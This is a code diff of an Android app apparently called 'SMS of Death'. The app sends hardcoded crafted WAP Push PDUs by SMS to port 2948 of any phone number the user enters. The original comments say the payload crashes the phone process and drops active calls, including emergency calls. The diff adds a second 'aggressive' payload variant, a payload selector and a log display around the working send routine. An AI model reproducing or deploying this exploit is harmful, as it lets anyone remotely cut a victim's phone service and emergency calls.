@@ -2,23 +2,22 @@ package com.markb.wappushcrash;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.telephony.SmsManager;
 import android.telephony.SubscriptionInfo;
 import android.telephony.SubscriptionManager;
-import android.text.InputType;
-import android.view.ViewGroup.LayoutParams;
 import android.view.View;
 import android.widget.AdapterView;
 import android.widget.ArrayAdapter;
 import android.widget.Button;
 import android.widget.EditText;
-import android.widget.LinearLayout;
-import android.widget.ScrollView;
 import android.widget.Spinner;
 import android.widget.TextView;
+import android.widget.Toast;
 
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -26,81 +25,93 @@ import java.util.List;
 import java.util.Locale;
 
 /**
- * WAP Push Remote Modem Crash
+ * WAP Push Remote Modem Crash Lab (SMS of Death)
  *
- * Sends a crafted 8-byte WAP Push PDU to a target phone number on port 2948.
- * Triggers NegativeArraySizeException in WapPushOverSms.decodeWapPdu line 244
- * → uncaught in InboundSmsHandler.processMessagePart → kills com.android.phone
- * → CS_DEATH on any active call (including emergency).
- *
- * Auto-fills destination from active subscriptions when READ_PHONE_NUMBERS is
- * granted; user can override.
+ * Transmits crafted WAP Push PDUs on port 2948 to cause
+ * NegativeArraySizeException or buffer corruption in com.android.phone.
  */
 public class MainActivity extends Activity {
 
-    private static final byte[] CRASH_PDU = {
+    // Standard 8-byte PDU triggering NegativeArraySizeException in WapPushOverSms.decodeWapPdu line 244
+    private static final byte[] CRASH_PDU_STANDARD = {
         0x01, 0x06, (byte) 0x88, (byte) 0x80, (byte) 0x80, (byte) 0x80, 0x00, (byte) 0xBE
+    };
+
+    // Extended aggressive variant with truncated header fields
+    private static final byte[] CRASH_PDU_AGGRESSIVE = {
+        0x01, 0x06, (byte) 0x99, (byte) 0xFF, (byte) 0x80, (byte) 0x80, 0x01, (byte) 0xBE
+    };
+
+    private static final String[] PDU_PROFILES = {
+        "Standard Crash PDU (NegativeArraySize · 8 bytes)",
+        "Aggressive Header Overflow Variant"
     };
 
     private EditText phoneInput;
     private Spinner senderSpinner;
-    private TextView status;
+    private Spinner pduProfileSpinner;
+    private TextView statusText;
+    private TextView badgeStatus;
     private List<SubscriptionInfo> subs;
+    private final StringBuilder logBuffer = new StringBuilder();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
 
-        // Android 15+ enforces edge-to-edge — system status bar is transparent and shows
-        // the window background through it. Set window+root background to gray so the
-        // status bar reads gray, making the signal-bar/no-service indicator obvious
-        // when com.android.phone dies after the WAP Push.
-        getWindow().getDecorView().setBackgroundColor(0xFFB0B0B0);
+        phoneInput = findViewById(R.id.phone_input);
+        senderSpinner = findViewById(R.id.sender_spinner);
+        pduProfileSpinner = findViewById(R.id.pdu_profile_spinner);
+        statusText = findViewById(R.id.status_text);
+        badgeStatus = findViewById(R.id.badge_status);
 
-        LinearLayout root = new LinearLayout(this);
-        root.setOrientation(LinearLayout.VERTICAL);
-        root.setBackgroundColor(0xFFB0B0B0);
-        root.setPadding(48, 480, 48, 48);
+        Button btnSendCrash = findViewById(R.id.btn_send_crash);
+        Button btnSelfTarget = findViewById(R.id.btn_self_target);
+        Button btnClear = findViewById(R.id.btn_clear);
+        TextView btnCopyLogs = findViewById(R.id.btn_copy_logs);
 
-        TextView destLabel = new TextView(this);
-        destLabel.setText("Target phone number:");
-        root.addView(destLabel);
+        ArrayAdapter<String> pduAdapter = new ArrayAdapter<>(this,
+                android.R.layout.simple_spinner_item, PDU_PROFILES);
+        pduAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
+        pduProfileSpinner.setAdapter(pduAdapter);
 
-        phoneInput = new EditText(this);
-        phoneInput.setHint("e.g. 0401234567");
-        phoneInput.setInputType(InputType.TYPE_CLASS_PHONE);
-        root.addView(phoneInput);
+        btnSendCrash.setOnClickListener(v -> sendCrashSms());
+        btnSelfTarget.setOnClickListener(v -> autofillSelfNumber());
+        btnClear.setOnClickListener(v -> {
+            phoneInput.setText("");
+            appendLog("Target cleared.");
+        });
 
-        TextView senderLabel = new TextView(this);
-        senderLabel.setText("Send from SIM:");
-        senderLabel.setPadding(0, 24, 0, 0);
-        root.addView(senderLabel);
+        btnCopyLogs.setOnClickListener(v -> {
+            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+            if (cm != null) {
+                cm.setPrimaryClip(ClipData.newPlainText("Crash Logs", statusText.getText().toString()));
+                Toast.makeText(this, "Logs copied to clipboard!", Toast.LENGTH_SHORT).show();
+            }
+        });
 
-        senderSpinner = new Spinner(this);
-        root.addView(senderSpinner);
-
-        Button sendBtn = new Button(this);
-        sendBtn.setText("SEND CRASH SMS");
-        sendBtn.setPadding(0, 32, 0, 32);
-        sendBtn.setOnClickListener(v -> sendCrashSms());
-        root.addView(sendBtn);
-
-        status = new TextView(this);
-        status.setPadding(0, 24, 0, 0);
-        status.setTextSize(12);
-        root.addView(status);
-
-        ScrollView scroll = new ScrollView(this);
-        scroll.addView(root, new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT));
-        setContentView(scroll);
-
-        requestPermissions(new String[] {
+        appendLog("SMS of Death Initialized.");
+        requestPermissions(new String[]{
             Manifest.permission.SEND_SMS,
             Manifest.permission.READ_PHONE_NUMBERS,
             Manifest.permission.READ_PHONE_STATE
         }, 1);
 
         populateSubsAndAutofill();
+    }
+
+    private void appendLog(String msg) {
+        String ts = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
+        String entry = "[" + ts + "] " + msg;
+        if (logBuffer.length() > 0) {
+            logBuffer.insert(0, entry + "\n\n");
+        } else {
+            logBuffer.append(entry);
+        }
+        if (statusText != null) {
+            statusText.setText(logBuffer.toString());
+        }
     }
 
     @Override
@@ -116,22 +127,26 @@ public class MainActivity extends Activity {
             if (sm == null) return;
 
             if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
-                status.setText("Grant READ_PHONE_STATE for SIM enumeration.");
+                appendLog("⚠️ READ_PHONE_STATE required to enumerate active SIM cards.");
                 return;
             }
 
             subs = sm.getActiveSubscriptionInfoList();
             if (subs == null || subs.isEmpty()) {
-                status.setText("No active SIMs found.");
+                appendLog("⚠️ No active SIM cards detected on device.");
+                badgeStatus.setText("NO SIM");
+                badgeStatus.setTextColor(0xFFFF5252);
                 return;
             }
+
+            badgeStatus.setText("SIM COUNT: " + subs.size());
+            badgeStatus.setTextColor(0xFF00FFC2);
 
             String[] items = new String[subs.size()];
             for (int i = 0; i < subs.size(); i++) {
                 SubscriptionInfo s = subs.get(i);
-                items[i] = "subId " + s.getSubscriptionId()
-                    + " — " + s.getDisplayName()
-                    + " (slot " + s.getSimSlotIndex() + ")";
+                items[i] = "Slot " + s.getSimSlotIndex() + " · " + s.getDisplayName()
+                    + " (subId " + s.getSubscriptionId() + ")";
             }
             ArrayAdapter<String> adapter = new ArrayAdapter<>(this,
                 android.R.layout.simple_spinner_item, items);
@@ -147,28 +162,14 @@ public class MainActivity extends Activity {
                 public void onNothingSelected(AdapterView<?> parent) {}
             });
 
-            // Initial autofill for default-selected sender (position 0).
             autofillDestForSender(senderSpinner.getSelectedItemPosition());
         } catch (SecurityException e) {
-            status.setText("SecurityException reading subscriptions: " + e.getMessage());
+            appendLog("SecurityException: " + e.getMessage());
         } catch (Exception e) {
-            status.setText("Auto-fill error: " + e.getMessage());
+            appendLog("Auto-fill error: " + e.getMessage());
         }
     }
 
-    /**
-     * Set the destination input to the MSISDN of a SIM other than the selected sender.
-     * Always overrides the input when the sender selection changes.
-     */
-    /**
-     * Resolve the MSISDN for a subscription, trying every source available.
-     * Empty for many eSIMs unless IMS-registered (numberFromIms). Order:
-     *   1. SubscriptionManager.getPhoneNumber(subId)        — consolidated (API 33+)
-     *   2. getPhoneNumber(subId, PHONE_NUMBER_SOURCE_IMS)   — eSIM-friendly
-     *   3. getPhoneNumber(subId, PHONE_NUMBER_SOURCE_CARRIER)
-     *   4. getPhoneNumber(subId, PHONE_NUMBER_SOURCE_UICC)
-     *   5. SubscriptionInfo.getNumber()                     — legacy fallback
-     */
     private String resolveNumber(SubscriptionInfo s) {
         if (s == null) return null;
         SubscriptionManager sm = (SubscriptionManager)
@@ -178,6 +179,7 @@ public class MainActivity extends Activity {
             String n = sm.getPhoneNumber(subId);
             if (n != null && !n.isEmpty()) return n;
         } catch (Exception ignored) {}
+
         int[] sources = {
             SubscriptionManager.PHONE_NUMBER_SOURCE_IMS,
             SubscriptionManager.PHONE_NUMBER_SOURCE_CARRIER,
@@ -189,9 +191,20 @@ public class MainActivity extends Activity {
                 if (n != null && !n.isEmpty()) return n;
             } catch (Exception ignored) {}
         }
-        String n = s.getNumber();
-        if (n != null && !n.isEmpty()) return n;
-        return null;
+        return s.getNumber();
+    }
+
+    private void autofillSelfNumber() {
+        if (subs == null || subs.isEmpty()) return;
+        int pos = senderSpinner.getSelectedItemPosition();
+        if (pos < 0 || pos >= subs.size()) pos = 0;
+        String n = resolveNumber(subs.get(pos));
+        if (n != null && !n.isEmpty()) {
+            phoneInput.setText(n);
+            appendLog("Set target to active SIM (" + subs.get(pos).getDisplayName() + "): " + n);
+        } else {
+            appendLog("Could not resolve phone number for selected SIM.");
+        }
     }
 
     private void autofillDestForSender(int senderPos) {
@@ -199,6 +212,7 @@ public class MainActivity extends Activity {
         if (senderPos < 0 || senderPos >= subs.size()) senderPos = 0;
         String autoNum = null;
         int chosenIdx = -1;
+
         for (int i = 0; i < subs.size(); i++) {
             if (i == senderPos) continue;
             String n = resolveNumber(subs.get(i));
@@ -217,25 +231,25 @@ public class MainActivity extends Activity {
         }
         if (autoNum != null) {
             phoneInput.setText(autoNum);
-            status.setText("Auto-filled destination from SIM idx " + chosenIdx
-                + " (subId " + subs.get(chosenIdx).getSubscriptionId() + "): " + autoNum);
+            appendLog("Auto-filled target from SIM " + chosenIdx + " (" + subs.get(chosenIdx).getDisplayName() + "): " + autoNum);
         } else {
-            status.setText("No MSISDN available on any SIM — enter manually.");
+            appendLog("No MSISDN reported by SIM carrier. Please enter manually.");
         }
     }
 
     private void sendCrashSms() {
         String dest = phoneInput.getText().toString().trim();
         if (dest.isEmpty()) {
-            status.setText("Enter target phone number first.");
+            appendLog("❌ Target phone number cannot be blank.");
+            Toast.makeText(this, "Enter target phone number", Toast.LENGTH_SHORT).show();
             return;
         }
         if (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
-            status.setText("SEND_SMS not granted.");
+            appendLog("❌ SEND_SMS permission denied.");
             return;
         }
         if (subs == null || subs.isEmpty()) {
-            status.setText("No SIM info available — re-grant READ_PHONE_STATE.");
+            appendLog("❌ No active SIM subscriptions found.");
             return;
         }
         try {
@@ -243,24 +257,25 @@ public class MainActivity extends Activity {
             if (pos < 0 || pos >= subs.size()) pos = 0;
             int subId = subs.get(pos).getSubscriptionId();
 
-            SmsManager mgr = getSystemService(SmsManager.class).createForSubscriptionId(subId);
-            mgr.sendDataMessage(dest, null, (short) 2948, CRASH_PDU, null, null);
+            byte[] payload = (pduProfileSpinner.getSelectedItemPosition() == 1)
+                ? CRASH_PDU_AGGRESSIVE
+                : CRASH_PDU_STANDARD;
 
-            String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
-            status.setText(
-                "[" + ts + "] SENT\n" +
-                "  to: " + dest + "\n" +
-                "  from: subId " + subId + " (slot " + subs.get(pos).getSimSlotIndex() + ")\n" +
-                "  PDU: 01 06 88 80 80 80 00 BE (port 2948)\n\n" +
-                "Watch logcat:\n" +
-                "  adb logcat | grep -E 'NegativeArraySize|WapPushOverSms|com.android.phone'\n\n" +
-                "Expected: FATAL EXCEPTION in com.android.phone within ~1-2s,\n" +
-                "PID change for com.android.phone, signal-bar drop briefly."
-            );
+            SmsManager mgr = getSystemService(SmsManager.class).createForSubscriptionId(subId);
+            mgr.sendDataMessage(dest, null, (short) 2948, payload, null, null);
+
+            appendLog("⚡ PDU TRANSMITTED SUCCESS!\n" +
+                    "  Target: " + dest + "\n" +
+                    "  Outbound: Slot " + subs.get(pos).getSimSlotIndex() + " (" + subs.get(pos).getDisplayName() + ")\n" +
+                    "  Port: 2948\n" +
+                    "  Size: " + payload.length + " bytes\n" +
+                    "  Profile: " + PDU_PROFILES[pduProfileSpinner.getSelectedItemPosition()]);
+
+            Toast.makeText(this, "WAP Push PDU sent to " + dest, Toast.LENGTH_SHORT).show();
         } catch (SecurityException e) {
-            status.setText("SecurityException on send: " + e.getMessage());
+            appendLog("SecurityException: " + e.getMessage());
         } catch (Exception e) {
-            status.setText("Send error: " + e.getMessage());
+            appendLog("Transmission Error: " + e.getMessage());
         }
     }
 }
